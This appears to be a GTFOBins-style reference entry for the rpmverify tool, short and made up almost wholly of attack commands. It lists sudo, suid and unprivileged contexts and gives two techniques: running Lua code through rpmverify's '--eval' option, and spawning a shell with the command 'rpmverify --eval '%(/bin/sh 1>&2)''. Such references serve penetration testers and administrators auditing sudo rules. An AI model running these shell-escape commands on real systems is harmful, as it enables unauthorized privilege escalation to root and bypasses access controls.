title: rpmverify
html:
rpmverify

Inherit

Context: sudo, suid, unprivileged

rpmverify --eval '%{lua:...}'

Shell

Context: sudo, suid, unprivileged

rpmverify --eval '%(/bin/sh 1>&2)'
